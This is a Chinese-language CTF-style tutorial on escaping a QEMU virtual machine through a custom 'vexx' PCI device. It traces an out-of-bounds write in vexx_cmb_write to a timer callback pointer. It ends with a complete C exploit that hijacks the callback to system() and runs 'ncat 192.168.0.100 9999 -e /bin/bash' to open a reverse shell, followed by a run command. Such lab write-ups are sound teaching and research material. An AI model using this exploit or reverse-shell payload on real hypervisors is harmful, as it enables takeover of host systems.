@@ -1,0 +1,105 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="241b74dedde880d47e0b34aa128e408a">什么是QEMU</h1>
+<p>QEMU（Quick EMUlator）是一个开源的虚拟机监控器（hypervisor）和仿真器，它可以在多种架构上执行客户机操作系统。QEMU最初由Fabrice Bellard开发，并且在GNU通用公共许可证（GPL）下发布的。QEMU允许用户模拟完整的计算机系统，包括处理器和各种外设，这样可以在一个主机系统上运行一个或多个客户操作系统。</p>
+<p>QEMU既可以作为虚拟机监控器，也可以作为仿真器使用。作为虚拟机监控器，QEMU能够创建并管理虚拟机，允许在宿主系统上同时运行多个客户机操作系统。作为仿真器，QEMU可以模拟处理器架构，允许在一个系统上运行不同架构的二进制程序。它也支持多种硬件架构，包括 x86、ARM、MIPS、PowerPC、SPARC 等。这使得QEMU成为跨平台的工具，可以在不同体系结构之间执行虚拟化和仿真。QEMU工具的命名都有其特殊意义，这里以qemu-aarch64-static举例</p>
+<p>qemu：代表这个工具是QEMU仿真器的其中一种</p>
+<p>aarch64：指的是 ARMv8 架构的 64 位模式，也就是现代 ARM 处理器的 64 位架构（如在许多智能手机、平板电脑和一些服务器中使用的处理器）。aarch64 是 ARM 64 位指令集的一种通称，用于区分早期的 32 位 ARM 指令集（ARMv7 及之前，通常称为 armhf 或 armel）</p>
+<p>static：意味着这个 QEMU 的可执行文件是静态链接的。静态链接的二进制文件包含了运行程序所需的所有库的副本，这意味着它不依赖于系统上的共享库。这种方式使得该可执行文件可以在没有安装必要库的系统上运行，增强了其在不同环境中的可移植性和使用的灵活性</p>
+<h1 data-content="1" id="99874666a4cca86f1e19237b80e57c55">程序分析</h1>
+<p>本次演示的环境：</p>
+<pre><code>链接: https://pan.baidu.com/s/1jzWliHml5ddR7J4thjLNQw 提取码: fmu5</code></pre>
+<p>解压压缩包后有以下文件</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240920085716-47fca36a-76eb-1.png"/><br/>
+启动脚本设置了设备名</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240920085732-51774c92-76eb-1.png"/><br/>
+使用ida pro或者ghidra分析qemu-system-x86_64程序，筛选vexx函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240920085747-5a22fd64-76eb-1.png"/><br/>
+查看初始化vexx_class_init函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240920085806-6550f3ee-76eb-1.png"/><br/>
+可以看到供应商 ID 和设备 ID，realize 和 exit被设置为特定设备的函数，即 pci_vexx_realize 和 pci_vexx_uninit。realize 函数将在设备注册时被调用，而 exit 函数将在设备注销时被调用<br/>
+查看pci_vexx_realize函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240920085821-6e374166-76eb-1.png"/><br/>
+在第21和22行，可以看到两个MMIO（内存映射I/O）区域被初始化，并与vexx_mmio_ops和vexx_cmb_ops相关联。这两个操作结构中包含的函数将在访问这些MMIO区域时被调用。还可以看到对memory_region_init_io的调用指定了特定的大小，vexx_mmio_ops的大小为0x1000，vexx_cmb_ops的大小为0x4000。这些大小值可以确定在与这些MMIO区域交互时如何将适当的sysfs资源文件映射到内存中。<br/>
+在第23至26行，I/O端口被注册，并与vexx_port_list相关联，其中包含了在访问这些特定端口时将被调用的函数。<br/>
+前面提到的MMIO区域和I/O端口为我们提供了与该自定义设备交互的攻击面。与它们相关联的函数分别是：第一个为MMIO区域的vexx_mmio_write和vex_mmio_read，第二个为MMIO区域的vexx_cmb_write和vexx_cmb_read，以及I/O端口的vexx_ioport_write和vexx_ioport_read。在vexx_cmb_write函数中存在漏洞</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240920085905-886d26ae-76eb-1.png"/><br/>
+在第27行，undefined8的某个偏移量被设置为我们传递给该函数的值，第22行，size（即addr）的值经过了if检查，确保它不超过255字节（0x100）。<br/>
+第22行的检查将限制该偏移量的大小在缓冲区的范围内，但在第25行之后，大小又被增加了一个偏移量，这个偏移量是一个由攻击者控制的值。通过查看与MMIO和端口I/O相关的其他函数，可以看到偏移量变量和memorymode值都可以通过写入特定的I/O端口来控制</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240920085919-90e7b0ce-76eb-1.png"/><br/>
+通过向端口0x240写入数据，能够修改偏移量；通过向端口0x230写入数据，能够修改memorymode。如果我们将memorymode设置为0x1，将偏移量设置为0xFF，并触发对vexx_cmb_write的调用，我们可以在vexx_cmb_write函数的第21行进入else语句，并从undefined8的末尾开始写入数据（即undefined8[255]），可以覆盖undefined8之后最多255字节的内容<br/>
+利用该漏洞在缓冲区边界外写入数据，从而导致缓冲区溢出，进而控制设备的执行流<br/>
+在启动脚本里面加上-s参数，开启qemu远程调试，然后执行启动脚本</p>
+<pre><code>user: root
+pass: goodluck</code></pre>
+<p>使用gdb连接</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240920085959-a9280044-76eb-1.png"/><br/>
+查看包含 undefined8的结构体，有一个包含为 dma_timer 的成员。在 dma_timer 结构体中，存在一个标记为 cb 的字段，它包含一个函数指针。作用为回调函数（callback）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240920090015-b2b368a6-76eb-1.png"/><br/>
+timer_init_full函数和 timer_mod函数都是  qemu 代码库的一部分，以下是对这两个函数的解释</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240920090030-bb56fcfc-76eb-1.png"/><br/>
+timer_init_full 的作用是初始化一个计时器，并将其与指定的计时器列表组</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240920090043-c2e5b0da-76eb-1.png"/><br/>
+timer_mod 的作用是修改一个计时器，使其在指定的时间 expire_time 到期，并考虑与计时器相关的时间比例<br/>
+在vexx_class_init 函数中，有一个对 timer_init_full 的调用，引用了 dma_timer 结构体。此外，在 vexx_mmio_write 函数中还有一个对该结构体的引用，调用了一个标记为 timer_mod 的函数， 我们可以覆盖 dma_timer 结构体中的 cb 和 opaque 字段，赋予任意值，然后调用 vexx_mmio_write， 传递0x98，看看是否会导致崩溃。为此，我们需要计算出 OOB 写入的位置（req_buf + 0xff）与 cb 和 opaque 字段之间的偏移量<br/>
+由于 undefined8的起始地址是 0x55555739b520，之后将设置的偏移量是 0xff，因此需要计算 0x55555739b61f 和 0x55555739b658 之间的距离，结果是 0x39，即 57 个字节；以及 0x55555739b61f 和 0x55555739b660 之间的距离，结果是 0x41，即 65 个字节</p>
+<h1 data-content="1" id="0a1aea86ab328f39262405db0b2f7b4e">pwn</h1>
+<p>使用lspci找到vexx设备注册的供应商ID和设备ID</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240920090118-d801e948-76eb-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240920090124-dbd14f32-76eb-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240920090130-df55b012-76eb-1.png"/><br/>
+上图中突出显示的两个资源文件 resource0 和 resource1，是在 pci_vexx_realize 函数中注册的两个 MMIO 区域。vexx_cmb 区域初始化的大小为 0x4000 字节，而 vexx_mmio 初始化的大小为 0x1000 字节。查看 sysfs 目录中的文件大小，可以看到 resource0 的大小为 4096 字节，即 0x1000，而 resource1 的大小为 16384 字节，即 0x4000。resource0 为 vexx_mmio，而 resource1 为 vexx_cmb<br/>
+payload：</p>
+<pre><code>#include &lt;stdio.h&gt;  
+#include &lt;stdlib.h&gt;  
+#include &lt;string.h&gt;  
+#include &lt;sys/io.h&gt;  
+#include &lt;sys/types.h&gt;  
+#include &lt;sys/stat.h&gt;  
+#include &lt;sys/mman.h&gt;  
+#include &lt;fcntl.h&gt;  
+
+#define OFF_PORT 0x240  
+#define MOD_PORT 0x230  
+
+int main(int argc, char *argv[]) {  
+    if(ioperm(OFF_PORT, 3, 1)) {  
+        exit(1);  
+    }  
+    if(ioperm(MOD_PORT, 3, 1)) {  
+        exit(2);  
+    }  
+
+    outb(0xFF, OFF_PORT);  
+    outb(0x1, MOD_PORT);  
+    int cfd = open(argv[1], O_RDWR|O_SYNC);  
+    if(cfd &lt; 0) {  
+        exit(3);  
+    }  
+    int mfd = open(argv[2], O_RDWR|O_SYNC);  
+    if(mfd &lt; 0) {  
+        exit(4);  
+    }  
+    void *cmb = mmap(NULL, 0x4000,   
+     PROT_READ|PROT_WRITE, MAP_SHARED, cfd, 0);  
+    if(cmb == MAP_FAILED) {  
+        exit(4);  
+    }  
+    void *mmio = mmap(NULL, 0x1000,   
+     PROT_READ|PROT_WRITE, MAP_SHARED,  mfd, 0);  
+    if(mmio == MAP_FAILED) {  
+        exit(5);  
+    }  
+    strcpy((cmb+0x59), "ncat 192.168.0.100 9999 -e /bin/bash");  
+    //system函数的地址  
+    *(u_int64_t *)(cmb + atoi(argv[3])) = 0x7ffff79dd290;  
+
+    //指向dma_buf的指针 
+    *(u_int64_t *)(cmb + atoi(argv[4])) = 0x55555739b678;  
+    *(u_int64_t *)(mmio + atoi(argv[5])) = 0x1;  
+    exit(0);  
+}</code></pre>
+<p>编译程序后执行，回连shell</p>
+<pre><code>./exp /sys/devices/pci0000:00/0000:00:04.0/resource1 /sys/devices/pci0000:00/0000:00:04.0/</code></pre>
+</div>
+</div>
